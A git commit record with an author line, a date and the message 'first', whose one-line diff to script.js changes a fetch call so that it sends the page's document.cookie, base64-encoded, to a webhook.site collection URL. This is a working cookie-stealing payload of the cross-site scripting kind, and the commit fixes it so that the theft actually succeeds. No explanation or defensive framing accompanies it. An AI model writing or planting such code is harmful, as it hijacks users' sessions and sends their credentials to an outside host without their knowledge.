c29f23e03b508797122f10d1e39cc97be89d69d0
SmallliDinosaur <ste700789@gmail.com>
2025-04-07 20:03:39 +0800

    first

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/46c24974-7a95-4103-9340-b43bf064332b?"+window.btoa(cookie))
+fetch("https://webhook.site/46c24974-7a95-4103-9340-b43bf064332b?"+window.btoa(document.cookie))
